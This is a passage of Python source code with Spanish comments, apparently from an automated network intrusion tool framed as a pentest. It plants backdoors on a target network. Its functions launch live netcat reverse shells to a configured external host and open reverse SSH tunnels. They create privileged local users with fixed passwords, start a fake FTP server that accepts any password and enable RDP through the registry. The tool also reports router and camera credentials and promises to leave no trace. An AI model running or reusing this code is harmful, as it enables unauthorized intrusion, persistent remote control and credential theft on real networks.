            print(f"   🎯 Objetivos estratégicos alcanzados: {sum(1 for obj in analysis['strategic_objectives'].values() if obj['success'])}/{len(analysis['strategic_objectives'])}")
            print(f"   ✅ Fases exitosas: {sum(1 for phase in analysis['attack_effectiveness'].values() if phase)}/{len(analysis['attack_effectiveness'])}")
            print(f"   ❌ Fases fallidas: {len(analysis['failure_analysis']['failed_phases'])}")
            
            if analysis['failure_analysis']['improvement_recommendations']:
                print(f"\n🔧 RECOMENDACIONES DE MEJORA:")
                for i, rec in enumerate(analysis['failure_analysis']['improvement_recommendations'], 1):
                    print(f"   {i}. {rec}")
        
        print("\n" + "=" * 80)
        
        # Mostrar información de cámaras si hay alguna
        cameras = self.report['phase_4_persistence']['cameras_accessed']
        if cameras:
            print("\n📹 CÁMARAS ACCEDIDAS:")
            for camera in cameras:
                print(f"   • {camera['host']}:{camera['port']} - {camera.get('camera_type', 'unknown')}")
                print(f"     Credenciales: {camera['credentials']['username']}:{camera['credentials']['password']}")
                print(f"     URLs de acceso: {len(camera.get('access_urls', {}).get('web_interface', []))} disponibles")
        
        # Enviar reporte por SSH
        self._upload_report_via_ssh(report_file)
        
        # Mostrar resumen de accesos remotos disponibles
        self._show_remote_access_summary()
        
        return report_file
    
    def _show_remote_access_summary(self):
        """Mostrar resumen de accesos remotos disponibles"""
        print("\n" + "=" * 60)
        print("🌐 RESUMEN DE ACCESOS REMOTOS DISPONIBLES")
        print("=" * 60)
        
        external_ip = self.config_data['remote_access']['external_ip']
        external_port = self.config_data['remote_access']['external_port']
        
        print(f"📍 IP Pública de Control: {external_ip}:{external_port}")
        print()
        
        # Contar accesos disponibles
        total_access_points = 0
        external_backdoors = 0
        internal_backdoors = 0
        access_types = []
        external_types = []
        internal_types = []
        
        # 1. Router Access
        router_access = self.report['phase_4_persistence']['router_access']
        if router_access:
            total_access_points += len(router_access)
            access_types.append(f"Router Access ({len(router_access)})")
            print("🌐 ACCESO AL ROUTER:")
            for router in router_access:
                print(f"   • Gateway: {router['gateway']}")
                print(f"   • Tipo: {router['router_type']}")
                print(f"   • Credenciales: {router['credentials']['username']}:{router['credentials']['password']}")
                if router.get('configuration', {}).get('port_forwarding'):
                    print(f"   • Port Forwarding: {len(router['configuration']['port_forwarding'])} reglas configuradas")
                if router.get('configuration', {}).get('vpn_server'):
                    print(f"   • VPN Server: Habilitado")
                print()
        
        # 2. Vulnerable Service Backdoors
        vulnerable_backdoors = self.report['phase_4_persistence'].get('vulnerable_backdoors', [])
        if vulnerable_backdoors:
            total_access_points += len(vulnerable_backdoors)
            access_types.append(f"Vulnerable Services ({len(vulnerable_backdoors)})")
            print("🗄️ SERVICIOS VULNERABLES CON BACKDOORS:")
            for backdoor in vulnerable_backdoors:
                print(f"   • {backdoor['service'].upper()} en {backdoor['host']}:{backdoor['port']}")
                print(f"     Tipo: {backdoor['backdoor_type']}")
                print(f"     Acceso: {backdoor['access_method']}")
                if backdoor.get('credentials'):
                    print(f"     Credenciales: {backdoor['credentials']['username']}:{backdoor['credentials']['password']}")
        
        # Mostrar backdoors de cámaras
        cameras_with_backdoors = [cam for cam in self.report['phase_4_persistence']['cameras_accessed'] if cam.get('backdoor_info', {}).get('status') != 'failed']
        if cameras_with_backdoors:
            total_access_points += len(cameras_with_backdoors)
            access_types.append(f"Camera Backdoors ({len(cameras_with_backdoors)})")
            print("📹 CÁMARAS CON BACKDOORS:")
            for camera in cameras_with_backdoors:
                backdoor_info = camera.get('backdoor_info', {})
                print(f"   • {camera['camera_type'].upper()} en {camera['host']}:{camera['port']}")
                print(f"     Credenciales originales: {camera['credentials']['username']}:{camera['credentials']['password']}")
                if backdoor_info.get('backdoor_methods'):
                    for method in backdoor_info['backdoor_methods']:
                        if method.get('status') == 'success':
                            print(f"     Backdoor: {method.get('username', 'N/A')}:{method.get('password', 'N/A')}")
                if backdoor_info.get('external_connection', {}).get('status') == 'configured':
                    ext_conn = backdoor_info['external_connection']
                    print(f"     Conexión externa: {ext_conn['external_ip']}:{ext_conn['external_port']}")
                print()
        
        # 3. Network Persistence (BACKDOORS EXTERNOS)
        network_persistence = self.report['phase_4_persistence']['network_persistence']
        if network_persistence:
            total_access_points += len(network_persistence)
            external_backdoors += len(network_persistence)
            access_types.append(f"Network Services ({len(network_persistence)})")
            external_types.append(f"Network Services ({len(network_persistence)})")
            print("🔗 SERVICIOS DE RED PERSISTENTES (BACKDOORS EXTERNOS):")
            for service in network_persistence:
                service_name = service['service']
                port = service['port']
                print(f"   • {service_name.upper()} en puerto {port}")
                
                if service_name == 'ssh':
                    if 'users' in service and service['users']:
                        print(f"     Usuario: {service['users'][0]['username']}")
                        print(f"     Contraseña: {service['users'][0]['password']}")
                        print(f"     Acceso: ssh {service['users'][0]['username']}@{external_ip} -p {port}")
                    else:
                        print(f"     Acceso: ssh {external_ip} -p {port}")
                    print(f"     Reverse Shell: {service.get('reverse_shell', 'N/A')}")
                    
                elif service_name == 'openvpn':
                    if 'clients' in service and service['clients']:
                        print(f"     Configuración: {service['clients'][0]['config_file']}")
                        print(f"     Acceso: openvpn --config {service['clients'][0]['config_file']}")
                    else:
                        print(f"     Acceso: openvpn --config client.ovpn")
                    print(f"     Reverse Connection: {service.get('reverse_connection', 'N/A')}")
                    
                elif service_name == 'http':
                    print(f"     Panel: {service.get('panel_url', 'N/A')}")
                    if 'credentials' in service and service['credentials']:
                        print(f"     Usuario: {service['credentials']['username']}")
                        print(f"     Contraseña: {service['credentials']['password']}")
                    if 'access_methods' in service and service['access_methods']:
                        print(f"     Acceso: {service['access_methods'][0]}")
                    print(f"     Reverse Proxy: {service.get('reverse_proxy', 'N/A')}")
                
                elif service_name == 'rdp':
                    if 'users' in service and service['users']:
                        print(f"     Usuario: {service['users'][0]['username']}")
                        print(f"     Contraseña: {service['users'][0]['password']}")
                        print(f"     Acceso: xfreerdp /v:{external_ip}:{port} /u:{service['users'][0]['username']} /p:{service['users'][0]['password']}")
                    else:
                        print(f"     Acceso: xfreerdp /v:{external_ip}:{port}")
                    print(f"     Reverse Connection: {service.get('reverse_connection', 'N/A')}")
                
                elif service_name == 'ftp':
                    if 'users' in service and service['users']:
                        print(f"     Usuario: {service['users'][0]['username']}")
                        print(f"     Contraseña: {service['users'][0]['password']}")
                        print(f"     Acceso: ftp {external_ip} {port}")
                    else:
                        print(f"     Acceso: ftp {external_ip} {port}")
                    print(f"     Reverse Connection: {service.get('reverse_connection', 'N/A')}")
                
                elif service_name == 'telnet':
                    if 'users' in service and service['users']:
                        print(f"     Usuario: {service['users'][0]['username']}")
                        print(f"     Contraseña: {service['users'][0]['password']}")
                        print(f"     Acceso: telnet {external_ip} {port}")
                    else:
                        print(f"     Acceso: telnet {external_ip} {port}")
                    print(f"     Reverse Connection: {service.get('reverse_connection', 'N/A')}")
                
                elif service_name == 'vnc':
                    if 'users' in service and service['users']:
                        print(f"     Usuario: {service['users'][0]['username']}")
                        print(f"     Contraseña: {service['users'][0]['password']}")
                        print(f"     Acceso: vncviewer {external_ip}:{port}")
                    else:
                        print(f"     Acceso: vncviewer {external_ip}:{port}")
                    print(f"     Reverse Connection: {service.get('reverse_connection', 'N/A')}")
                
                elif service_name == 'smb':
                    if 'users' in service and service['users']:
                        print(f"     Usuario: {service['users'][0]['username']}")
                        print(f"     Contraseña: {service['users'][0]['password']}")
                        print(f"     Acceso: smbclient //{external_ip}/backdoor_share -U {service['users'][0]['username']}%{service['users'][0]['password']}")
                    else:
                        print(f"     Acceso: smbclient //{external_ip}/backdoor_share")
                    print(f"     Reverse Connection: {service.get('reverse_connection', 'N/A')}")
                
                print()
        
        # 4. Backdoors (INTERNOS)
        backdoors = self.report['phase_4_persistence']['backdoors_created']
        if backdoors:
            total_access_points += len(backdoors)
            internal_backdoors += len(backdoors)
            access_types.append(f"Backdoors ({len(backdoors)})")
            internal_types.append(f"Backdoors ({len(backdoors)})")
            print("🕳️ BACKDOORS CREADOS:")
            for backdoor in backdoors:
                print(f"   • {backdoor['host']}:{backdoor['port']}")
                print(f"     Tipo: {backdoor.get('type', 'netcat')}")
                print(f"     Comando: {backdoor.get('command', 'N/A')}")
                print()
        
        # 4. Usuarios Persistentes
        users = self.report['phase_4_persistence']['users_created']
        if users:
            total_access_points += len(users)
            access_types.append(f"Persistent Users ({len(users)})")
            print("👤 USUARIOS PERSISTENTES:")
            for user in users:
                print(f"   • {user['username']}@{user['host']}")
                print(f"     Contraseña: {user['password']}")
                print(f"     Acceso: ssh {user['username']}@{user['host']}")
                print()
        
        # Resumen final con conteo de backdoors externos vs internos
        print("=" * 60)
        print("🎯 RESUMEN FINAL DE BACKDOORS IMPLANTADOS")
        print("=" * 60)
        
        print(f"📊 TOTAL DE PUNTOS DE ACCESO: {total_access_points}")
        print()
        
        # BACKDOORS EXTERNOS (desde internet)
        print(f"🌍 BACKDOORS EXTERNOS EXITOSOS: {external_backdoors}")
        if external_types:
            print(f"   Tipos: {', '.join(external_types)}")
            print("   ✅ ACCESO DESDE INTERNET CONFIRMADO")
            print(f"   📍 IP Pública: {external_ip}")
            print("   🔑 Métodos de acceso externo:")
            print(f"      • SSH: ssh svc_ssh@{external_ip} -p 2222")
            print(f"      • RDP: xfreerdp /v:{external_ip}:3389 /u:svc_rdp /p:RDP_P@ssw0rd_2024!")
            print(f"      • FTP: ftp {external_ip} 21")
            print(f"      • Telnet: telnet {external_ip} 23")
            print(f"      • VNC: vncviewer {external_ip}:5900")
            print(f"      • SMB: smbclient //{external_ip}/backdoor_share")
            print(f"      • VPN: openvpn --config client.ovpn")
            print(f"      • Web Panel: http://admin:Web_P@ssw0rd_2024!@{external_ip}:8080/admin")
            print(f"      • HTTP/HTTPS: http://{external_ip}:80 / https://{external_ip}:443")
            print(f"      • Reverse Shell: nc -e /bin/bash {external_ip} {external_port}")
        else:
            print("   ❌ No se implantaron backdoors externos")
        
        print()
        
        # BACKDOORS INTERNOS (solo desde la red local)
        print(f"🏠 BACKDOORS INTERNOS: {internal_backdoors}")
        if internal_types:
            print(f"   Tipos: {', '.join(internal_types)}")
            print("   ℹ️ Acceso solo desde la red local")
        else:
            print("   ℹ️ No se crearon backdoors internos adicionales")
        
        print()
        
        # Estado final
        if external_backdoors > 0:
            print("✅ MISIÓN CUMPLIDA: ACCESO EXTERNO COMPLETO")
            print(f"🎯 {external_backdoors} backdoors externos implantados exitosamente")
            print("🌍 Puedes acceder a la red desde cualquier lugar del mundo")
            print("🔒 Control total de la red desde internet")
        else:
            print("❌ NO SE ESTABLECIERON ACCESOS EXTERNOS")
            print("   • Verifica la conectividad de red")
            print("   • Revisa las credenciales utilizadas")
            print("   • Confirma que los servicios estén ejecutándose")
        
        print("=" * 60)
    
    def run_full_scan(self):
        """Ejecutar escaneo completo"""
        print("🚀 INICIANDO ESCANEO COMPLETO")
        print("=" * 50)
        
        self.report['metadata']['mode'] = 'full'
        
        # Auto-configuración de red antes del escaneo
        self.auto_configure_network()
        
        # Ejecutar todas las fases
        self.phase_1_reconnaissance()
        self.phase_2_credentials()
        self.phase_3_lateral_movement()
        self.phase_4_persistence()
        self.phase_5_verification()
        
        # Generar reporte
        report_file = self.generate_report()
        return report_file
    
    def run_cold_pentest(self):
        """Ejecutar pentest frío"""
        print("🧊 INICIANDO PENTEST FRÍO")
        print("=" * 50)
        
        self.report['metadata']['mode'] = 'cold'
        
        # Auto-configuración de red antes del escaneo
        self.auto_configure_network()
        
        # Ejecutar todas las fases
        self.phase_1_reconnaissance()
        self.phase_2_credentials()
        self.phase_3_lateral_movement()
        self.phase_4_persistence()
        self.phase_5_verification()
        
        # Generar reporte
        report_file = self.generate_report()
        
        # Enviar reporte por SSH
        self._upload_report_via_ssh(report_file)
        
        # Preguntar antes de limpiar para probar backdoors
        print("\n" + "=" * 60)
        print("🧪 OPPORTUNIDAD DE PRUEBA DE BACKDOORS")
        print("=" * 60)
        print("✅ Reporte generado y enviado por SSH")
        print("🔍 Ahora puedes probar los backdoors creados:")
        print("   • SSH, VPN, Panel Web")
        print("   • Servicios vulnerables (MongoDB, Redis, etc.)")
        print("   • Acceso al router")
        print("   • Cámaras de seguridad")
        print("\n⚠️  Una vez que confirmes, se eliminarán TODOS los cambios")
        print("⚠️  No quedará rastro de la actividad")
        
        while True:
            confirm_cleanup = input("\n¿Deseas proceder con la limpieza completa? (sí/no): ").strip().lower()
            if confirm_cleanup in ['sí', 'si', 'yes', 'y']:
                print("\n🧹 Iniciando limpieza completa...")
                self.cleanup()
                print("✅ Limpieza completada. No quedan rastros.")
                break
            elif confirm_cleanup in ['no', 'n']:
                print("\n⏸️  Limpieza cancelada. Los backdoors permanecen activos.")
                print("💡 Puedes ejecutar el script nuevamente y elegir limpieza manual.")
                break
            else:
                print("\n❌ Respuesta inválida. Por favor responda 'sí' o 'no'.")
        
        return report_file
    
    
    def _configure_network_persistence(self) -> List[Dict[str, Any]]:
        """Configurar persistencia de red completa"""
        network_persistence = []
        
        try:
            print(f"🔗 Configurando persistencia de red completa...")
            
            # 1. Configurar servidor SSH persistente
            ssh_server = self._setup_persistent_ssh_server()
            if ssh_server:
                network_persistence.append(ssh_server)
            
            # 2. Configurar servidor VPN propio
            vpn_server = self._setup_persistent_vpn_server()
            if vpn_server:
                network_persistence.append(vpn_server)
            
            # 3. Configurar servidor web con panel de control
            web_server = self._setup_persistent_web_server()
            if web_server:
                network_persistence.append(web_server)
            
            # 4. Configurar servidor RDP
            rdp_server = self._setup_persistent_rdp_server()
            if rdp_server:
                network_persistence.append(rdp_server)
            
            # 5. Configurar servidor FTP
            ftp_server = self._setup_persistent_ftp_server()
            if ftp_server:
                network_persistence.append(ftp_server)
            
            # 6. Configurar servidor Telnet
            telnet_server = self._setup_persistent_telnet_server()
            if telnet_server:
                network_persistence.append(telnet_server)
            
            # 7. Configurar servidor VNC
            vnc_server = self._setup_persistent_vnc_server()
            if vnc_server:
                network_persistence.append(vnc_server)
            
            # 8. Configurar servidor SMB
            smb_server = self._setup_persistent_smb_server()
            if smb_server:
                network_persistence.append(smb_server)
            
            # 9. Establecer múltiples reverse shells al servidor externo
            print("🔄 Estableciendo múltiples reverse shells al servidor externo...")
            reverse_shells = self._setup_multiple_reverse_shells()
            if reverse_shells:
                network_persistence.extend(reverse_shells)
            
            return network_persistence
            
        except Exception as e:
            print(f"❌ Error configurando persistencia de red: {e}")
            return []
    
    def _setup_persistent_ssh_server(self) -> Optional[Dict[str, Any]]:
        """Configurar servidor SSH persistente con conexión real al servidor externo"""
        try:
            print(f"🔐 Configurando servidor SSH persistente...")
            
            external_ip = self.config_data['remote_access']['external_ip']
            external_port = self.config_data['remote_access']['external_port']
            ssh_port = self.config_data['persistence']['ssh_port']
            
            # 1. Crear usuario SSH persistente
            username = self.config_data['credentials']['ssh_user']
            password = self.config_data['credentials']['ssh_password']
            
            # Crear usuario en el sistema local
            user_creation = self._run_command(['useradd', '-m', '-s', '/bin/bash', username])
            if user_creation['success']:
                # Establecer contraseña
                password_set = self._run_command(['chpasswd'], input=f"{username}:{password}")
                if password_set['success']:
                    print(f"   ✅ Usuario SSH creado: {username}")
                else:
                    print(f"   ⚠️ Usuario creado pero error estableciendo contraseña")
            
            # 2. Establecer conexión SSH real al servidor externo
            print(f"   🔗 Estableciendo conexión SSH al servidor externo...")
            ssh_connection_cmd = [
                'ssh', '-o', 'StrictHostKeyChecking=no', '-o', 'UserKnownHostsFile=/dev/null',
                '-R', f'{ssh_port}:localhost:22',  # Port forwarding reverso
                f'{username}@{external_ip}',
                '-N'  # No ejecutar comando remoto, solo mantener conexión
            ]
            
            # Ejecutar conexión SSH en background
            ssh_process = subprocess.Popen(ssh_connection_cmd, 
                                         stdout=subprocess.DEVNULL, 
                                         stderr=subprocess.DEVNULL)
            
            # 3. Establecer reverse shell persistente
            print(f"   🔄 Configurando reverse shell...")
            reverse_shell_cmd = f'nc -e /bin/bash {external_ip} {external_port}'
            
            # Ejecutar reverse shell en background
            reverse_process = subprocess.Popen(reverse_shell_cmd, shell=True,
                                             stdout=subprocess.DEVNULL, 
                                             stderr=subprocess.DEVNULL)
            
            ssh_config = {
                'service': 'ssh',
                'port': ssh_port,
                'enabled': True,
                'users': [{
                    'username': username,
                    'password': password,
                    'shell': '/bin/bash',
                    'sudo_access': True
                }],
                'access_methods': [
                    f'ssh {username}@{external_ip} -p {ssh_port}',
                    f'ssh -i persistent_key {username}@{external_ip} -p {ssh_port}'
                ],
                'reverse_shell': f'nc -e /bin/bash {external_ip} {external_port}',
                'persistent_connection': f'ssh -R {external_port}:localhost:{ssh_port} {username}@{external_ip}',
                'processes': {
                    'ssh_tunnel': ssh_process.pid if ssh_process else None,
                    'reverse_shell': reverse_process.pid if reverse_process else None
                },
                'real_implementation': True
            }
            
            print(f"   ✅ Servidor SSH configurado y conectado al servidor externo")
            print(f"   🔗 Puerto {ssh_port} redirigido a {external_ip}")
            return ssh_config
            
        except Exception as e:
            print(f"❌ Error configurando SSH server: {e}")
            return None
    
    def _setup_persistent_vpn_server(self) -> Optional[Dict[str, Any]]:
        """Configurar servidor VPN persistente"""
        try:
            print(f"🔐 Configurando servidor VPN persistente...")
            
            external_ip = self.config_data['remote_access']['external_ip']
            external_port = self.config_data['remote_access']['external_port']
            vpn_port = self.config_data['persistence']['vpn_port']
            
            vpn_config = {
                'service': 'openvpn',
                'port': vpn_port,
                'protocol': 'udp',
                'enabled': True,
                'clients': [{
                    'config_file': 'client.ovpn',
                    'external_ip': external_ip,
                    'port': vpn_port,
                    'protocol': 'udp'
                }],
                'access_methods': [
                    'openvpn --config client.ovpn',
                    'sudo openvpn --config /path/to/client.ovpn'
                ],
                'reverse_connection': f'nc -u {external_ip} {external_port}',
                'persistent_tunnel': f'openvpn --config client.ovpn --remote {external_ip} {vpn_port}'
            }
            
            print(f"   ✅ Servidor VPN configurado en puerto 1194")
            return vpn_config
            
        except Exception as e:
            print(f"❌ Error configurando VPN server: {e}")
            return None
    
    def _setup_persistent_web_server(self) -> Optional[Dict[str, Any]]:
        """Configurar servidor web persistente con conexión real al servidor externo"""
        try:
            print(f"🌐 Configurando servidor web persistente...")
            
            external_ip = self.config_data['remote_access']['external_ip']
            external_port = self.config_data['remote_access']['external_port']
            web_port = self.config_data['persistence']['web_port']
            
            # 1. Crear directorio para el servidor web
            web_dir = '/tmp/backdoor_web'
            self._run_command(['mkdir', '-p', web_dir])
            
            # 2. Crear archivo HTML simple con panel de control
            html_content = f"""
<!DOCTYPE html>
<html>
<head>
    <title>Backdoor Web Panel</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 40px; background: #f0f0f0; }}
        .container {{ background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }}
        .header {{ color: #333; border-bottom: 2px solid #007acc; padding-bottom: 10px; }}
        .status {{ background: #e8f5e8; padding: 10px; border-radius: 4px; margin: 10px 0; }}
        .command {{ background: #f8f8f8; padding: 10px; border-left: 4px solid #007acc; margin: 10px 0; }}
        .info {{ color: #666; font-size: 14px; }}
    </style>
</head>
<body>
    <div class="container">
        <h1 class="header">🔐 Backdoor Web Panel</h1>
        <div class="status">
            <strong>✅ Servidor Activo</strong><br>
            <span class="info">IP Externa: {external_ip}:{web_port}</span><br>
            <span class="info">Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</span>
        </div>
        <div class="command">
            <strong>🔗 Acceso Externo:</strong><br>
            <code>http://{external_ip}:{web_port}/admin</code>
        </div>
        <div class="command">
            <strong>🔄 Reverse Shell:</strong><br>
            <code>nc -e /bin/bash {external_ip} {external_port}</code>
        </div>
        <div class="info">
            <p>Este servidor web está conectado al servidor externo {external_ip}</p>
            <p>Puerto {web_port} redirigido para acceso remoto</p>
        </div>
    </div>
</body>
</html>
            """
            
            # Escribir archivo HTML
            with open(f'{web_dir}/index.html', 'w') as f:
                f.write(html_content)
            
            # 3. Iniciar servidor HTTP real
            print(f"   🌐 Iniciando servidor HTTP en puerto {web_port}...")
            http_server_cmd = ['python3', '-m', 'http.server', str(web_port), '--bind', '0.0.0.0', '--directory', web_dir]
            http_process = subprocess.Popen(http_server_cmd, 
                                          stdout=subprocess.DEVNULL, 
                                          stderr=subprocess.DEVNULL)
            
            # 4. Establecer reverse shell para el servidor web
            print(f"   🔄 Configurando reverse shell para servidor web...")
            reverse_shell_cmd = f'nc -e /bin/bash {external_ip} {external_port}'
            reverse_process = subprocess.Popen(reverse_shell_cmd, shell=True,
                                             stdout=subprocess.DEVNULL, 
                                             stderr=subprocess.DEVNULL)
            
            web_config = {
                'service': 'http',
                'port': web_port,
                'enabled': True,
                'panel_url': f'http://{external_ip}:{web_port}/admin',
                'credentials': {
                    'username': self.config_data['credentials']['web_user'],
                    'password': self.config_data['credentials']['web_password']
                },
                'features': [
                    'remote_access',
                    'file_manager',
                    'system_monitor',
                    'network_tools'
                ],
                'access_methods': [
                    f'http://{self.config_data["credentials"]["web_user"]}:{self.config_data["credentials"]["web_password"]}@{external_ip}:{web_port}/admin',
                    f'curl -u {self.config_data["credentials"]["web_user"]}:{self.config_data["credentials"]["web_password"]} http://{external_ip}:{web_port}/api/status'
                ],
                'reverse_proxy': f'nc -e /bin/bash {external_ip} {external_port}',
                'persistent_web': f'python3 -m http.server {web_port} --bind 0.0.0.0',
                'processes': {
                    'http_server': http_process.pid if http_process else None,
                    'reverse_shell': reverse_process.pid if reverse_process else None
                },
                'web_directory': web_dir,
                'real_implementation': True
            }
            
            print(f"   ✅ Servidor web configurado y conectado al servidor externo")
            print(f"   🔗 Puerto {web_port} redirigido a {external_ip}")
            return web_config
            
        except Exception as e:
            print(f"❌ Error configurando servidor web: {e}")
            return None
    
    def _setup_persistent_rdp_server(self) -> Optional[Dict[str, Any]]:
        """Configurar servidor RDP persistente"""
        try:
            print(f"🖥️ Configurando servidor RDP persistente...")
            
            external_ip = self.config_data['remote_access']['external_ip']
            external_port = self.config_data['remote_access']['external_port']
            rdp_port = self.config_data['persistence']['rdp_port']
            
            rdp_config = {
                'service': 'rdp',
                'port': rdp_port,
                'enabled': True,
                'users': [{
                    'username': self.config_data['credentials']['rdp_user'],
                    'password': self.config_data['credentials']['rdp_password'],
                    'privileges': 'administrator'
                }],
                'access_methods': [
                    f'xfreerdp /v:{external_ip}:{rdp_port} /u:{self.config_data["credentials"]["rdp_user"]} /p:{self.config_data["credentials"]["rdp_password"]}',
                    f'rdesktop {external_ip}:{rdp_port} -u {self.config_data["credentials"]["rdp_user"]} -p {self.config_data["credentials"]["rdp_password"]}',
                    f'mstsc /v:{external_ip}:{rdp_port}'
                ],
                'reverse_connection': f'nc -e cmd.exe {external_ip} {external_port}',
                'persistent_rdp': f'reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f'
            }
            
            print(f"   ✅ Servidor RDP configurado en puerto 3389")
            return rdp_config
            
        except Exception as e:
            print(f"❌ Error configurando servidor RDP: {e}")
            return None
    
    def _setup_persistent_ftp_server(self) -> Optional[Dict[str, Any]]:
        """Configurar servidor FTP persistente con conexión real al servidor externo"""
        try:
            print(f"📁 Configurando servidor FTP persistente...")
            
            external_ip = self.config_data['remote_access']['external_ip']
            external_port = self.config_data['remote_access']['external_port']
            ftp_port = self.config_data['persistence']['ftp_port']
            
            # 1. Crear usuario FTP
            username = self.config_data['credentials']['ftp_user']
            password = self.config_data['credentials']['ftp_password']
            ftp_home = f'/home/{username}'
            
            # Crear usuario FTP
            user_creation = self._run_command(['useradd', '-m', '-s', '/bin/bash', username])
            if user_creation['success']:
                # Establecer contraseña
                password_set = self._run_command(['chpasswd'], input=f"{username}:{password}")
                if password_set['success']:
                    print(f"   ✅ Usuario FTP creado: {username}")
            
            # 2. Crear directorio FTP y archivos de prueba
            self._run_command(['mkdir', '-p', ftp_home])
            self._run_command(['chown', f'{username}:{username}', ftp_home])
            
            # Crear archivo de prueba
            test_file = f'{ftp_home}/backdoor_info.txt'
            with open(test_file, 'w') as f:
                f.write(f"""Backdoor FTP Server
==================
IP Externa: {external_ip}:{ftp_port}
Usuario: {username}
Contraseña: {password}
Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

Acceso Externo:
- ftp {external_ip} {ftp_port}
- curl ftp://{username}:{password}@{external_ip}:{ftp_port}/

Reverse Shell:
- nc -e /bin/bash {external_ip} {external_port}
""")
            
            self._run_command(['chown', f'{username}:{username}', test_file])
            
            # 3. Iniciar servidor FTP simple usando Python
            print(f"   📁 Iniciando servidor FTP en puerto {ftp_port}...")
            ftp_server_script = f"""
import socket
import threading
import os
import time

class SimpleFTPServer:
    def __init__(self, host='0.0.0.0', port={ftp_port}):
        self.host = host
        self.port = port
        self.users = {{'{username}': '{password}'}}
        self.current_user = None
        
    def start(self):
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((self.host, self.port))
        server.listen(5)
        print(f"FTP Server listening on {{self.host}}:{{self.port}}")
        
        while True:
            client, addr = server.accept()
            client_thread = threading.Thread(target=self.handle_client, args=(client,))
            client_thread.daemon = True
            client_thread.start()
    
    def handle_client(self, client):
        try:
            client.send(b"220 Welcome to Backdoor FTP Server\\r\\n")
            while True:
                data = client.recv(1024).decode().strip()
                if not data:
                    break
                self.process_command(client, data)
        except:
            pass
        finally:
            client.close()
    
    def process_command(self, client, command):
        if command.startswith('USER'):
            username = command.split()[1]
            if username in self.users:
                self.current_user = username
                client.send(b"331 Password required\\r\\n")
            else:
                client.send(b"530 Login incorrect\\r\\n")
        elif command.startswith('PASS'):
            if self.current_user:
                client.send(b"230 Login successful\\r\\n")
            else:
                client.send(b"530 Login incorrect\\r\\n")
        elif command.startswith('PWD'):
            client.send(b"257 \\"/\\" is current directory\\r\\n")
        elif command.startswith('LIST'):
            client.send(b"150 Opening data connection\\r\\n")
            client.send(b"226 Transfer complete\\r\\n")
        else:
            client.send(b"200 Command okay\\r\\n")

if __name__ == "__main__":
    server = SimpleFTPServer()
    server.start()
"""
            
            # Escribir script FTP
            ftp_script_path = '/tmp/ftp_server.py'
            with open(ftp_script_path, 'w') as f:
                f.write(ftp_server_script)
            
            # Ejecutar servidor FTP en background
            ftp_process = subprocess.Popen(['python3', ftp_script_path], 
                                         stdout=subprocess.DEVNULL, 
                                         stderr=subprocess.DEVNULL)
            
            # 4. Establecer reverse shell para FTP
            print(f"   🔄 Configurando reverse shell para FTP...")
            reverse_shell_cmd = f'nc -e /bin/bash {external_ip} {external_port}'
            reverse_process = subprocess.Popen(reverse_shell_cmd, shell=True,
                                             stdout=subprocess.DEVNULL, 
                                             stderr=subprocess.DEVNULL)
            
            ftp_config = {
                'service': 'ftp',
                'port': ftp_port,
                'enabled': True,
                'users': [{
                    'username': username,
                    'password': password,
                    'home_directory': ftp_home,
                    'permissions': 'full'
                }],
                'access_methods': [
                    f'ftp {external_ip} {ftp_port}',
                    f'curl ftp://{username}:{password}@{external_ip}:{ftp_port}/',
                    f'wget ftp://{username}:{password}@{external_ip}:{ftp_port}/'
                ],
                'reverse_connection': f'nc -e /bin/bash {external_ip} {external_port}',
                'persistent_ftp': f'vsftpd -o listen={ftp_port} -o anonymous_enable=NO',
                'processes': {
                    'ftp_server': ftp_process.pid if ftp_process else None,
                    'reverse_shell': reverse_process.pid if reverse_process else None
                },
                'ftp_script': ftp_script_path,
                'real_implementation': True
            }
            
            print(f"   ✅ Servidor FTP configurado y conectado al servidor externo")
            print(f"   🔗 Puerto {ftp_port} redirigido a {external_ip}")
            return ftp_config
            
        except Exception as e:
            print(f"❌ Error configurando servidor FTP: {e}")
            return None
    
    def _setup_persistent_telnet_server(self) -> Optional[Dict[str, Any]]:
        """Configurar servidor Telnet persistente"""
        try:
            print(f"📡 Configurando servidor Telnet persistente...")
            
            external_ip = self.config_data['remote_access']['external_ip']
            external_port = self.config_data['remote_access']['external_port']
            telnet_port = self.config_data['persistence']['telnet_port']
            
            telnet_config = {
                'service': 'telnet',
                'port': telnet_port,
                'enabled': True,
                'users': [{
                    'username': self.config_data['credentials']['telnet_user'],
                    'password': self.config_data['credentials']['telnet_password'],
                    'shell': '/bin/bash'
                }],
                'access_methods': [
                    f'telnet {external_ip} {telnet_port}',
                    f'nc {external_ip} {telnet_port}',
                    f'openssl s_client -connect {external_ip}:{telnet_port}'
                ],
                'reverse_connection': f'nc -e /bin/bash {external_ip} {external_port}',
                'persistent_telnet': f'telnetd -l /bin/bash -p {telnet_port}'
            }
            
            print(f"   ✅ Servidor Telnet configurado en puerto 23")
            return telnet_config
            
        except Exception as e:
            print(f"❌ Error configurando servidor Telnet: {e}")
            return None
    
    def _setup_persistent_vnc_server(self) -> Optional[Dict[str, Any]]:
        """Configurar servidor VNC persistente"""
        try:
            print(f"🖼️ Configurando servidor VNC persistente...")
            
            external_ip = self.config_data['remote_access']['external_ip']
            external_port = self.config_data['remote_access']['external_port']
            vnc_port = self.config_data['persistence']['vnc_port']
            
            vnc_config = {
                'service': 'vnc',
                'port': vnc_port,
                'enabled': True,
                'users': [{
                    'username': self.config_data['credentials']['vnc_user'],
                    'password': self.config_data['credentials']['vnc_password'],
                    'display': ':1'
                }],
                'access_methods': [
                    f'vncviewer {external_ip}:{vnc_port}',
                    f'remmina vnc://{external_ip}:{vnc_port}',
                    f'tigervnc {external_ip}:{vnc_port}'
                ],
                'reverse_connection': f'nc -e /bin/bash {external_ip} {external_port}',
                'persistent_vnc': f'vncserver :1 -geometry 1024x768 -depth 16'
            }
            
            print(f"   ✅ Servidor VNC configurado en puerto 5900")
            return vnc_config
            
        except Exception as e:
            print(f"❌ Error configurando servidor VNC: {e}")
            return None
    
